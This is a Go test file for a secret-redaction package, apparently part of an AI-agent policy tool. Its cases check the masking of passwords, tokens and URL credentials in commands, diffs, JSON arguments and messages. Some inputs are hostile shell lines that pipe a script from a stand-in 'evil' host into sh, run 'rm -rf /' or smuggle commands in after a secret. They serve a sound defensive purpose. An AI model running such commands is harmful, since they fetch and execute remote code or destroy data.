package redact

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/railse/railse-opc/internal/policy"
)

var stringCases = []shellCase{
	{`curl -H "Authorization: Bearer abc.def.ghi" https://x.y`, `curl -H "Authorization: <redacted>" https://x.y`},
	{`curl -H 'Authorization: Basic dXNlcjpwYXNz' https://x.y`, `curl -H 'Authorization: <redacted>' https://x.y`},
	{`export TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123`, `export TOKEN=<redacted>`},
	{`API_KEY=sk-abcdefghijklmnopqrstuvwxyz npm test`, `API_KEY=<redacted> npm test`},
	{`npm login --password hunter2 --username bob`, `npm login --password <redacted> --username bob`},
	{`echo password=secret123 > .env`, `echo password=<redacted> > .env`},
	{`git push origin main`, `git push origin main`},
	{`ls -la`, `ls -la`},
	{`curl https://x.y/?api_key=abcdefghijklmnopqrstu`, `curl https://x.y/?api_key=<redacted>`},
	{`xoxb-1234567890-abcdefghijklmnop`, `<redacted>`},
	{`AKIAIOSFODNN7EXAMPLE1`, `<redacted>`},
}

func TestString(t *testing.T) {
	for _, c := range stringCases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

func TestPayload(t *testing.T) {
	p := policy.Payload{Type: policy.PayloadShell, Command: "curl -H 'Authorization: Bearer zzz' https://x.y", DiffPreview: "password=abc", URL: "https://x.y/?token=abcdefghijklmnopqrstuv", Args: []byte(`{"token":"ghp_abcdefghijklmnopqrstuvwxyz0123"}`)}
	out := Payload(p)
	if strings.Contains(out.Command, "zzz") || strings.Contains(out.DiffPreview, "abc") || strings.Contains(out.URL, "abcdefghijklmnopqrstuv") || strings.Contains(string(out.Args), "ghp_") {
		t.Fatalf("未脱敏: %+v", out)
	}
	if p.Command == out.Command {
		t.Fatal("应返回新值而不是原值")
	}
}

// 覆盖简报替换目标里上面用例没测到的写法：单独的 Bearer、带引号的值、--flag=值、带连字符的键名，
// 以及键名带数字或 . : / 前缀、不该误抹的普通参数、值后面紧跟的 shell 元字符。
var moreFormsCases = []shellCase{
	{`curl -H "X-Auth: Bearer abcdef123" https://x.y`, `curl -H "X-Auth: Bearer <redacted>" https://x.y`},
	{`npm login --password "hunter 2" --username bob`, `npm login --password <redacted> --username bob`},
	{`gh auth login --token 'abc123'`, `gh auth login --token <redacted>`},
	{`mysql --password=hunter2 -u root`, `mysql --password=<redacted> -u root`},
	{`export PASSWORD="hunter 2"`, `export PASSWORD=<redacted>`},
	// 命令行语境里未加引号的 & 本来就结束一个裸词（后台运行），值在 & 处停，后面的部分露出来；URL 字段走 url 语境，见 TestPayloadFieldModes
	{`curl https://x.y/?a=1&access-token=abc&b=2`, `curl https://x.y/?a=1&access-token=<redacted>&b=2`},
	{`passwd=abc secret=def apikey=ghi`, `passwd=<redacted> secret=<redacted> apikey=<redacted>`},
	{`sk-abcdefghijklmnopqrstuvwxyz`, `<redacted>`},
	{`git commit -m "fix token refresh"`, `git commit -m "fix token refresh"`},
	// 键名带数字，或前面是 . : / 等
	{`OAUTH2_CLIENT_SECRET=abc`, `OAUTH2_CLIENT_SECRET=<redacted>`},
	{`S3_SECRET_KEY=abc`, `S3_SECRET_KEY=<redacted>`},
	{`DB2_PASSWORD=abc`, `DB2_PASSWORD=<redacted>`},
	{`TOKEN=abc TOKEN2=def`, `TOKEN=<redacted> TOKEN2=<redacted>`},
	{`spring.datasource.password=hunter2`, `spring.datasource.password=<redacted>`},
	{`//registry.npmjs.org/:_authToken=abc`, `//registry.npmjs.org/:_authToken=<redacted>`},
	// 键名前面紧贴 = # 等任意字符
	{`kubectl create secret generic db --from-literal=password=hunter2`, `kubectl create secret generic db --from-literal=password=<redacted>`},
	{`docker run --env=DB_PASSWORD=hunter2`, `docker run --env=DB_PASSWORD=<redacted>`},
	{`#DB_PASSWORD=hunter2`, `#DB_PASSWORD=<redacted>`},
	// 不是凭据的普通参数原样保留
	{`git log --author=bob`, `git log --author=bob`},
	{`git commit --author="Bob <b@x>"`, `git commit --author="Bob <b@x>"`},
	{`llm --max-tokens=4096`, `llm --max-tokens=4096`},
	// 命令行里的裸值在 shell 元字符处停，不连带抹掉紧贴的命令；引号和 heredoc 里的值照旧整段抹，不漏半截密码
	{`password=abc;rm -rf /`, `password=<redacted>;rm -rf /`},
	// $( 开始命令替换，不是字面秘密，原样保留
	{`export GITHUB_TOKEN=$(gh auth token)`, `export GITHUB_TOKEN=$(gh auth token)`},
	{`docker run -e "POSTGRES_PASSWORD=Xy7&kP(2)q" postgres`, `docker run -e "POSTGRES_PASSWORD=<redacted>" postgres`},
	{`echo "DB_PASSWORD=Xy7&kP(2)q" >> .env`, `echo "DB_PASSWORD=<redacted>" >> .env`},
	{"cat > .env <<'EOF'\nDB_PASSWORD=Xy7&kP(2)q\nSECRET_KEY=ab;cd|ef\nEOF", "cat > .env <<'EOF'\nDB_PASSWORD=<redacted>\nSECRET_KEY=<redacted>\nEOF"},
}

func TestStringMoreForms(t *testing.T) {
	for _, c := range moreFormsCases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

// JSON 原文里转义过的 \"...\" 要整段抹掉，且不能吞掉反斜杠，结果仍是合法 JSON。
var escapedQuoteCases = []shellCase{
	{`{"command":"npm login --password \"hunter2\""}`, `{"command":"npm login --password <redacted>"}`},
	{`{"command":"export PASSWORD=\"hunter2\""}`, `{"command":"export PASSWORD=<redacted>"}`},
	{`{"command":"curl -H \"Authorization: Bearer abc123\" https://x"}`, `{"command":"curl -H \"Authorization: <redacted>\" https://x"}`},
	// 只抹到第一个 \"，不把后面的参数一起吞掉
	{`{"command":"tool --password \"a\" --user \"b\""}`, `{"command":"tool --password <redacted> --user \"b\""}`},
	// 终审 I1 补的写法在 JSON 原文里同样不吞反斜杠
	{`{"command":"curl -u \"alice:S3cret\" https://x"}`, `{"command":"curl -u \"alice:<redacted>\" https://x"}`},
	{`{"command":"curl -H \"X-API-Key: abc\" https://x"}`, `{"command":"curl -H \"X-API-Key: <redacted>\" https://x"}`},
	{`{"command":"git clone \"https://alice:S3cret@h/r.git\""}`, `{"command":"git clone \"https://alice:<redacted>@h/r.git\""}`},
	{`{"command":"mysql -e \"x\" -p\"S3cret\" app"}`, `{"command":"mysql -e \"x\" -p<redacted> app"}`},
}

func TestStringEscapedQuotes(t *testing.T) {
	for _, c := range escapedQuoteCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if !json.Valid([]byte(got)) {
			t.Errorf("String(%q) 结果不是合法 JSON: %q", c.in, got)
		}
	}
}

// 合法 JSON 的 Args 按结构脱敏：敏感键的值整体抹掉，其余字符串逐个脱敏，结果仍是合法 JSON。
func TestPayloadArgs(t *testing.T) {
	cases := []struct{ in, want string }{
		{`{"command":"npm login --password \"hunter2\""}`, `{"command":"npm login --password <redacted>"}`},
		{`{"command":"export PASSWORD=\"hunter2\""}`, `{"command":"export PASSWORD=<redacted>"}`},
		{`{"command":"curl -H \"Authorization: Bearer abc123\" https://x"}`, `{"command":"curl -H \"Authorization: <redacted>\" https://x"}`},
		{`{"password":"hunter2","title":"t"}`, `{"password":"<redacted>","title":"t"}`},
		{`{"headers":{"Authorization":"Basic dXNlcjpwYXNz"},"env":["GH_TOKEN=abc","X=1"]}`, `{"env":["GH_TOKEN=<redacted>","X=1"],"headers":{"Authorization":"<redacted>"}}`},
		// 字符串叶子是文件内容等普通文本：键名前可带 + #，值不按 shell 元字符截断
		{`{"content":"+DB_PASSWORD=hunter2\n#TOKEN=abc"}`, `{"content":"+DB_PASSWORD=<redacted>\n#TOKEN=<redacted>"}`},
		{`{"content":"SECRET_KEY=a(b)&c|d"}`, `{"content":"SECRET_KEY=<redacted>"}`},
		// 不是敏感键的原样保留，大整数不丢精度
		{`{"author":"bob","id":12345678901234567890,"max_tokens":4096}`, `{"author":"bob","id":12345678901234567890,"max_tokens":4096}`},
	}
	for _, c := range cases {
		out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(c.in)})
		if string(out.Args) != c.want {
			t.Errorf("Args %s\n 得到 %s\n 想要 %s", c.in, out.Args, c.want)
		}
		if !json.Valid(out.Args) {
			t.Errorf("Args %s 脱敏后不是合法 JSON: %s", c.in, out.Args)
		}
		if _, err := json.Marshal(out); err != nil {
			t.Errorf("Args %s 脱敏后整个载荷无法序列化: %v", c.in, err)
		}
	}

	// 不是合法 JSON 时退回按字符串处理
	bad := `{"command":"export PASSWORD=\"hunter2\"`
	out := Payload(policy.Payload{Type: policy.PayloadMCP, Args: json.RawMessage(bad)})
	if strings.Contains(string(out.Args), "hunter2") {
		t.Errorf("非法 JSON 的 Args 未脱敏: %s", out.Args)
	}
}

// Payload 按字段语境脱敏：Command 的裸值在空白、引号、反斜杠或 shell 元字符处停，Path 与 DiffPreview 的值抹到空白或引号，
// URL 的值在 & 处停。
func TestPayloadFieldModes(t *testing.T) {
	out := Payload(policy.Payload{
		Command: `password=abc;rm -rf /`,
		Path:    `/srv/app/password=a;b`,
		URL:     `https://x.y/?token=abc&next=/home`,
	})
	if want := `password=<redacted>;rm -rf /`; out.Command != want {
		t.Errorf("Command 得到 %q 想要 %q", out.Command, want)
	}
	if want := `/srv/app/password=<redacted>`; out.Path != want {
		t.Errorf("Path 得到 %q 想要 %q", out.Path, want)
	}
	if want := `https://x.y/?token=<redacted>&next=/home`; out.URL != want {
		t.Errorf("URL 得到 %q 想要 %q", out.URL, want)
	}

	diffs := []struct{ in, want string }{
		// Codex apply_patch 的补丁原文，新增行以 + 开头
		{"*** Add File: .env\n+DB_PASSWORD=hunter2\n+API_KEY=abc123", "*** Add File: .env\n+DB_PASSWORD=<redacted>\n+API_KEY=<redacted>"},
		{`DB_PASSWORD=Xy7&kP(2)q`, `DB_PASSWORD=<redacted>`},
		{`API_TOKEN=ab;cd|ef<gh>ij\kl`, `API_TOKEN=<redacted>`},
	}
	for _, c := range diffs {
		got := Payload(policy.Payload{Type: policy.PayloadFileWrite, DiffPreview: c.in}).DiffPreview
		if got != c.want {
			t.Errorf("DiffPreview %q\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

func TestText(t *testing.T) {
	cases := []struct{ in, want string }{
		// Gemini 的 ToolPermission 通知把完整命令拼进消息
		{`Gemini CLI requires execution: export GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123 && npm publish`, `Gemini CLI requires execution: export GITHUB_TOKEN=<redacted> && npm publish`},
		// 文本语境：值一直抹到空白，含 & ( 的强密码不只抹掉前半截
		{`已设置 POSTGRES_PASSWORD=Xy7&kP(2)q 完成`, `已设置 POSTGRES_PASSWORD=<redacted> 完成`},
		{`用 ghp_abcdefghijklmnopqrstuvwxyz0123 推送`, `用 <redacted> 推送`},
		{`改完了，测试全过。`, `改完了，测试全过。`},
	}
	for _, c := range cases {
		if got := Text(c.in); got != c.want {
			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

// 终审 I1 补的几种凭据写法：URL 里的 user:pass、curl 的 -u/--user、API key 类请求头、MYSQL_PWD 这类以 pwd 结尾的键名、
// mysql 紧贴 -p 的密码。每种都配反例：同样的形状但不是凭据的，原样保留。
var credentialGapCases = []shellCase{
	// URL 的 userinfo：任意 scheme，用户名留着，只抹密码
	{`git clone https://alice:S3cretPass@git.example.com/r.git`, `git clone https://alice:<redacted>@git.example.com/r.git`},
	{`psql postgres://u:S3cretPass@db/x`, `psql postgres://u:<redacted>@db/x`},
	{`DATABASE_URL=mysql://root:S3cretPass@127.0.0.1:3306/app npm start`, `DATABASE_URL=mysql://root:<redacted>@127.0.0.1:3306/app npm start`},
	{`redis-cli -u redis://:S3cretPass@cache:6379/0 ping`, `redis-cli -u redis://:<redacted>@cache:6379/0 ping`},
	{`git push 'https://bot:S3cret@git.example.com/r.git' main`, `git push 'https://bot:<redacted>@git.example.com/r.git' main`},
	{`pip install git+https://u:p@ss@git.example.com/pkg`, `pip install git+https://u:<redacted>@git.example.com/pkg`},
	// 反例：没有 userinfo，或只有用户名、端口
	{`git clone https://github.com/org/repo.git`, `git clone https://github.com/org/repo.git`},
	{`git clone git@github.com:org/repo.git`, `git clone git@github.com:org/repo.git`},
	{`git clone ssh://git@git.example.com:2222/org/repo.git`, `git clone ssh://git@git.example.com:2222/org/repo.git`},
	{`curl http://localhost:8080/users/bob@example.com`, `curl http://localhost:8080/users/bob@example.com`},
	{`curl http://[::1]:8080/x`, `curl http://[::1]:8080/x`},

	// curl 的 -u/--user/-U/--proxy-user user:pass：用户名留着，只抹密码
	{`curl -u alice:S3cretPass https://api.example.com`, `curl -u alice:<redacted> https://api.example.com`},
	{`curl --user alice:S3cretPass https://x`, `curl --user alice:<redacted> https://x`},
	{`curl -s -ualice:S3cretPass https://x`, `curl -s -ualice:<redacted> https://x`},
	{`curl -u 'alice:S3cret Pass' https://x`, `curl -u 'alice:<redacted>' https://x`},
	{`curl -u "alice:S3cret" https://x`, `curl -u "alice:<redacted>" https://x`},
	{`curl -u :S3cretToken https://x`, `curl -u :<redacted> https://x`},
	{`curl -U proxyuser:S3cret -x http://proxy:3128 https://x`, `curl -U proxyuser:<redacted> -x http://proxy:3128 https://x`},
	{`curl -X POST "https://x/?a=1&b=2;c" -u alice:S3cret`, `curl -X POST "https://x/?a=1&b=2;c" -u alice:<redacted>`},
	{`/usr/bin/curl -fsS --proxy-user bob:S3cret https://x`, `/usr/bin/curl -fsS --proxy-user bob:<redacted> https://x`},
	// wget 的密码走 --password/--http-password，已有规则覆盖
	{`wget --user=alice --password=S3cret https://x`, `wget --user=alice --password=<redacted> https://x`},
	{`wget --http-user alice --http-password S3cret https://x`, `wget --http-user alice --http-password <redacted> https://x`},
	// 反例：-u 不带冒号（curl 会提示输入密码）、不是 curl 的 -u、跨过 && ; | 的别的命令、--user-agent
	{`curl -u alice https://x`, `curl -u alice https://x`},
	{`docker run -u 1000:1000 alpine id`, `docker run -u 1000:1000 alpine id`},
	{`curl -fsS https://x && docker run -u 1000:1000 alpine id`, `curl -fsS https://x && docker run -u 1000:1000 alpine id`},
	{`curl -fsS https://x; docker exec -u root:root c sh`, `curl -fsS https://x; docker exec -u root:root c sh`},
	{`curl -fsS https://x | sudo -u bob:staff tee out`, `curl -fsS https://x | sudo -u bob:staff tee out`},
	{`curl --user-agent "bot:1.0" https://x`, `curl --user-agent "bot:1.0" https://x`},
	{`git push -u origin main`, `git push -u origin main`},
	{`sort -u names.txt`, `sort -u names.txt`},

	// API key 类请求头（头名大小写不敏感，-H 参数常用引号包裹）
	{`curl -H 'X-API-Key: abcdef123456' https://x`, `curl -H 'X-API-Key: <redacted>' https://x`},
	{`curl -H "api-key: abcdef" https://x`, `curl -H "api-key: <redacted>" https://x`},
	{`curl --header "PRIVATE-TOKEN: glpat-abcdef" https://gitlab.example.com/api/v4/projects`, `curl --header "PRIVATE-TOKEN: <redacted>" https://gitlab.example.com/api/v4/projects`},
	{`curl -H 'x-auth-token:abc123' https://x`, `curl -H 'x-auth-token:<redacted>' https://x`},
	{`curl -H "X-Goog-Api-Key: AIzaSyabc" -H "X-Vault-Token: hvs.abc" https://x`, `curl -H "X-Goog-Api-Key: <redacted>" -H "X-Vault-Token: <redacted>" https://x`},
	// 反例：普通请求头、名字里只是含 tokens 的字段
	{`curl -H 'Content-Type: application/json' -H 'Accept: */*' https://x`, `curl -H 'Content-Type: application/json' -H 'Accept: */*' https://x`},
	{`echo "max-tokens: 4096"`, `echo "max-tokens: 4096"`},

	// 以 pwd 结尾的键名（前面要有 _ . - 分隔）：MYSQL_PWD 是 mysql 读的密码环境变量
	{`MYSQL_PWD=S3cretPass mysql -u root app`, `MYSQL_PWD=<redacted> mysql -u root app`},
	{`export DB_PWD="S3cret Pass"`, `export DB_PWD=<redacted>`},
	// 反例：PWD、OLDPWD 是 shell 的目录变量，cwd 是工作目录，pwd 是命令。代价是单独的 pwd=xxx 不抹（多半是目录）
	{`cd /srv/app && PWD=/srv/app make`, `cd /srv/app && PWD=/srv/app make`},
	{`OLDPWD=/tmp cwd=/srv/app pwd=/srv/app tool`, `OLDPWD=/tmp cwd=/srv/app pwd=/srv/app tool`},
	{`echo $PWD && pwd`, `echo $PWD && pwd`},

	// mysql 系命令紧贴 -p 的密码
	{`mysql -u root -pS3cretPass app`, `mysql -u root -p<redacted> app`},
	{`mysqldump -uroot -p'S3cret Pass' app > dump.sql`, `mysqldump -uroot -p<redacted> app > dump.sql`},
	{`mysql -e "select 1; select 2" -pS3cret`, `mysql -e "select 1; select 2" -p<redacted>`},
	{`mariadb -h db -pS3cret`, `mariadb -h db -p<redacted>`},
	// 反例：-p 单独出现（mysql 会提示输入密码，后面的是库名）、-P 是端口、不是 mysql 的 -p、跨过 ; && 的别的命令
	{`mysql -u root -p app`, `mysql -u root -p app`},
	{`mysql -h db -P 3306 -u root app`, `mysql -h db -P 3306 -u root app`},
	{`mysql -h db -P3306 -u root app`, `mysql -h db -P3306 -u root app`},
	{`mkdir -p build/out`, `mkdir -p build/out`},
	{`ssh -p2222 host`, `ssh -p2222 host`},
	{`mysql -u root -p app; mkdir -pv build`, `mysql -u root -p app; mkdir -pv build`},
	{`mysql -u root -p app && mkdir -pv build`, `mysql -u root -p app && mkdir -pv build`},
}

func TestStringCredentialGaps(t *testing.T) {
	for _, c := range credentialGapCases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		// hub 收到守护进程已脱敏的载荷后会再跑一次，结果必须不变
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
}

// 终审复审 R1–R3 与 curl 组合短选项：反斜杠续行的同一条命令、未闭合的引号（适配器把 diff_preview 截到 4 KB，
// 截断点落在引号括起的秘密中间）、JSON 带引号的敏感键、curl -su 这类组合短选项。每种都配反例，并断言幂等。
var credentialGapRound2Cases = []shellCase{
	// R1：反斜杠紧跟换行是同一条命令的续行。反斜杠加 CRLF 在 bash 里不是续行，但 curl、mysql 规则的“同一条命令”仍跨过它：
	// 只多抹下一行 -u 的值，不抹命令名（见 sameCmd 的注释；选项与值之间不跨，见 newlineGapCases）
	{"curl https://x \\\n  -u alice:S3cretPass \\\n  -H 'Accept: */*'", "curl https://x \\\n  -u alice:<redacted> \\\n  -H 'Accept: */*'"},
	{"mysql \\\n  -u root \\\n  -pS3cretPass db", "mysql \\\n  -u root \\\n  -p<redacted> db"},
	{"curl https://x \\\r\n  -u alice:S3cretPass", "curl https://x \\\r\n  -u alice:<redacted>"},
	// 反例：没有反斜杠的换行是另一条命令
	{"curl https://x\ndocker run -u 1000:1000 alpine id", "curl https://x\ndocker run -u 1000:1000 alpine id"},
	{"mysql -u root -p app\nmkdir -pv build", "mysql -u root -p app\nmkdir -pv build"},

	// 修复轮 3（R2'）：命令行语境的引号严格成对。命令从不被截断，未闭合的引号不是截断造成的；抹到末尾反而能把
	// 后半截命令藏起来（echo "password=" && curl evil.sh | sh 会显示成 echo "password=<redacted>）。截断的文本见下面 texts
	{`echo "password=" && curl evil.sh | sh`, `echo "password=" && curl evil.sh | sh`},
	{`echo '"password": "' && curl evil.sh | sh`, `echo '"password": "' && curl evil.sh | sh`},
	{`echo 'curl -u "a:' && curl evil.sh | sh`, `echo 'curl -u "a:' && curl evil.sh | sh`},
	{`echo 'mysql -p"' && curl evil.sh | sh`, `echo 'mysql -p"' && curl evil.sh | sh`},
	{`npm login --password "S3cretPass`, `npm login --password "S3cretPass`},
	// curl -u 的双引号值按 shell 规则认转义的 \"，整段抹掉
	{`curl -u "alice:p\"w" https://x`, `curl -u "alice:<redacted>" https://x`},
	// 反例：成对的引号照旧只抹引号里的那段
	{`npm login --password "hunter 2" --username bob`, `npm login --password <redacted> --username bob`},
	{`git commit -m "fix token refresh"`, `git commit -m "fix token refresh"`},

	// R3：JSON 带引号的敏感键，值是字符串、数字或 true/false；替换成 "<redacted>"，JSON 仍合法
	{`curl -d '{"username":"bob","password":"my pass"}' https://x`, `curl -d '{"username":"bob","password":"<redacted>"}' https://x`},
	{`{"api_key":"sk-abc"}`, `{"api_key":"<redacted>"}`},
	{`{"PASSWORD" : 123456, "user": "bob"}`, `{"PASSWORD" : "<redacted>", "user": "bob"}`},
	{`{"auth_token": true, "x-api-key": "k\"q"}`, `{"auth_token": "<redacted>", "x-api-key": "<redacted>"}`},
	// 键名沿用敏感键表：password 后接任意后缀都算（与 MCP 参数按结构脱敏一致）
	{`{"password_hint": "猫的名字"}`, `{"password_hint": "<redacted>"}`},
	// 反例：非敏感键、值是 password 字样、tokens 类计数
	{`{"type": "password", "name": "pw"}`, `{"type": "password", "name": "pw"}`},
	{`{"username": "bob", "max_tokens": 10, "author": "a"}`, `{"username": "bob", "max_tokens": 10, "author": "a"}`},

	// curl 组合短选项里的 -u、-U
	{`curl -su alice:S3cret https://x`, `curl -su alice:<redacted> https://x`},
	{`curl -sSu alice:S3cret https://x`, `curl -sSu alice:<redacted> https://x`},
	{`curl -fsSLU proxy:S3cret -x http://p:3128 https://x`, `curl -fsSLU proxy:<redacted> -x http://p:3128 https://x`},
	// 反例：不在 curl 命令里的 -u（含组合选项）
	{`curl -sS https://x && sudo -su root:wheel id`, `curl -sS https://x && sudo -su root:wheel id`},
	{`curl -sS -o out.txt https://x`, `curl -sS -o out.txt https://x`},
}

func TestStringCredentialGapsRound2(t *testing.T) {
	for _, c := range credentialGapRound2Cases {
		got := String(c.in)
		if got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := String(got); again != got {
			t.Errorf("String 不幂等: %q → %q", got, again)
		}
	}
	// 截断的 diff_preview、事件消息：文本语境同样抹到末尾
	texts := []struct{ in, want string }{
		{`password="abcdefghij`, `password=<redacted>`},
		{"*** Add File: .env\n+DB_HOST=db\n+DB_PASSWORD=\"Xy7&kP(2)q-abc", "*** Add File: .env\n+DB_HOST=db\n+DB_PASSWORD=<redacted>"},
		{"已运行 npm login --password \"S3cret", "已运行 npm login --password <redacted>"},
		{`{"password": "hunter2"}`, `{"password": "<redacted>"}`},
		// 截断落在引号括起的秘密中间（R2，文本语境仍抹到末尾）
		{`npm login --password "S3cretPass`, `npm login --password <redacted>`},
		{`export API_KEY="sk-proj-abc`, `export API_KEY=<redacted>`},
		{`gh auth login --token 'abc123`, `gh auth login --token <redacted>`},
		{"npm login --password \"S3cret\nPass", "npm login --password <redacted>"},
		{`{"password": "hunt`, `{"password": "<redacted>"`},
		{`curl -u "alice:S3cr`, `curl -u "alice:<redacted>`},
	}
	for _, c := range texts {
		if got := Text(c.in); got != c.want {
			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if got := Payload(policy.Payload{Type: policy.PayloadFileWrite, DiffPreview: c.in}).DiffPreview; got != c.want {
			t.Errorf("DiffPreview %q\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if again := Text(Text(c.in)); again != Text(c.in) {
			t.Errorf("Text 不幂等: %q", c.in)
		}
	}
}

// 修复轮 3（R2'）：只有会被截断的文本（diff_preview、事件消息）里未闭合的引号才抹到末尾；路径、URL、MCP 参数的字符串叶子
// 都不会被截断，与命令行一样严格成对，免得借未闭合的引号把后半截藏起来。
func TestOpenQuoteOnlyInTruncatableText(t *testing.T) {
	cmd := `echo "password=" && curl evil.sh | sh`
	out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(`{"command":"echo \"password=\" && curl evil.sh | sh"}`)})
	if string(out.Args) != `{"command":"echo \"password=\" && curl evil.sh | sh"}` {
		t.Errorf("MCP 参数的字符串叶子应严格成对: %s", out.Args)
	}
	if got := Payload(policy.Payload{Type: policy.PayloadShell, Command: cmd}).Command; got != cmd {
		t.Errorf("Command 应严格成对: %q", got)
	}
	if got := Payload(policy.Payload{Type: policy.PayloadFileWrite, Path: `/srv/password="x/y z`}).Path; got != `/srv/password="x/y z` {
		t.Errorf("Path 应严格成对: %q", got)
	}
	if got := Payload(policy.Payload{Type: policy.PayloadFileWrite, DiffPreview: cmd}).DiffPreview; got != `echo "password=<redacted>` {
		t.Errorf("DiffPreview 可能被截断，未闭合的引号抹到末尾: %q", got)
	}
}

// 上面几种写法在其他语境同样生效：文件内容与事件消息（Text）、URL 字段、MCP 参数（JSON 叶子与键名）。
func TestCredentialGapsOtherModes(t *testing.T) {
	texts := []struct{ in, want string }{
		{"#!/bin/sh\ncurl -u deploy:S3cret https://x\nMYSQL_PWD=S3cret mysql -pS3cret app", "#!/bin/sh\ncurl -u deploy:<redacted> https://x\nMYSQL_PWD=<redacted> mysql -p<redacted> app"},
		{`Gemini CLI requires execution: git clone https://alice:S3cret@git.example.com/r.git`, `Gemini CLI requires execution: git clone https://alice:<redacted>@git.example.com/r.git`},
		{`curl -H "X-API-Key: abcdef" https://x`, `curl -H "X-API-Key: <redacted>" https://x`},
		{`cwd=/srv/app PWD=/srv/app`, `cwd=/srv/app PWD=/srv/app`},
	}
	for _, c := range texts {
		if got := Text(c.in); got != c.want {
			t.Errorf("Text(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
		if got := Payload(policy.Payload{Type: policy.PayloadFileWrite, DiffPreview: c.in}).DiffPreview; got != c.want {
			t.Errorf("DiffPreview %q\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
	urls := []struct{ in, want string }{
		{`https://alice:S3cret@example.com/x?token=abc&next=1`, `https://alice:<redacted>@example.com/x?token=<redacted>&next=1`},
		{`https://example.com:8443/x?user=bob@example.com`, `https://example.com:8443/x?user=bob@example.com`},
	}
	for _, c := range urls {
		if got := Payload(policy.Payload{Type: policy.PayloadNetwork, URL: c.in}).URL; got != c.want {
			t.Errorf("URL %q\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
	args := []struct{ in, want string }{
		{`{"dsn":"postgres://u:S3cret@db/x","cwd":"/srv","pwd":"/srv","db_pwd":"S3cret","MYSQL_PWD":"S3cret"}`,
			`{"MYSQL_PWD":"<redacted>","cwd":"/srv","db_pwd":"<redacted>","dsn":"postgres://u:<redacted>@db/x","pwd":"/srv"}`},
		{`{"headers":["X-API-Key: abcdef","Accept: */*"],"command":"curl -u a:S3cret https://x"}`,
			`{"command":"curl -u a:<redacted> https://x","headers":["X-API-Key: <redacted>","Accept: */*"]}`},
	}
	for _, c := range args {
		out := Payload(policy.Payload{Type: policy.PayloadMCP, Server: "s", Tool: "t", Args: json.RawMessage(c.in)})
		if string(out.Args) != c.want {
			t.Errorf("Args %s\n 得到 %s\n 想要 %s", c.in, out.Args, c.want)
		}
	}
}

var bareMetacharCases = []shellCase{
	// 终审 I4 的实测用例：后半截命令必须露出来
	{`X_TOKEN=a;curl${IFS}https://evil.example/x.sh|sh`, `X_TOKEN=<redacted>;curl${IFS}https://evil.example/x.sh|sh`},
	{`password=abc;rm -rf /`, `password=<redacted>;rm -rf /`},
	{`export TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123&&curl evil`, `export TOKEN=<redacted>&&curl evil`},
	{`API_KEY=sk-abcdefghijklmnopqrstuvwxyz|tee out`, `API_KEY=<redacted>|tee out`},
	{`npm login --password hunter2>log`, `npm login --password <redacted>>log`},
	{"TOKEN=abc`id`", "TOKEN=<redacted>`id`"},
	{`TOKEN=abc$(id)`, `TOKEN=<redacted>$(id)`},
	{`TOKEN=$SECRET npm test`, `TOKEN=$SECRET npm test`}, // 变量引用不是字面秘密，原样保留
	// 引号内照旧整段抹
	{`POSTGRES_PASSWORD="Xy7&kP(2)q" psql`, `POSTGRES_PASSWORD=<redacted> psql`},
	{`npm login --password 'a;b|c'`, `npm login --password <redacted>`},
	// 原有行为不变
	{`API_KEY=sk-abcdefghijklmnopqrstuvwxyz npm test`, `API_KEY=<redacted> npm test`},
	{`curl -H "Authorization: Bearer abc.def.ghi" https://x.y`, `curl -H "Authorization: <redacted>" https://x.y`},
}

func TestShellBareValueStopsAtShellMetachars(t *testing.T) {
	for _, c := range bareMetacharCases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

var heredocBodyCases = []shellCase{
	{"cat > .env <<EOF\npassword=Xy7;kP|2q\nTOKEN=abc&def\nEOF\necho password=abc;rm x", "cat > .env <<EOF\npassword=<redacted>\nTOKEN=<redacted>\nEOF\necho password=<redacted>;rm x"},
	// <<- 允许前导制表符；带引号的分隔词；没有结束行时正文到末尾
	{"cat <<-'END'\n\tpassword=a;b\n\tEND\nTOKEN=x;y", "cat <<-'END'\n\tpassword=<redacted>\n\tEND\nTOKEN=<redacted>;y"},
	{"cat <<EOF\npassword=a;b", "cat <<EOF\npassword=<redacted>"},
}

func TestShellHeredocBodyKeepsGreedyRedaction(t *testing.T) {
	for _, c := range heredocBodyCases {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

// 起点在最后一行、正文为空、结束行紧跟起点、<< 后面没有分隔词时都不丢文本，没有可抹的内容就原样返回。
func TestShellHeredocShapesRoundTrip(t *testing.T) {
	for _, in := range heredocShapes {
		if got := String(in); got != in {
			t.Errorf("String(%q) = %q，应原样返回", in, got)
		}
	}
}

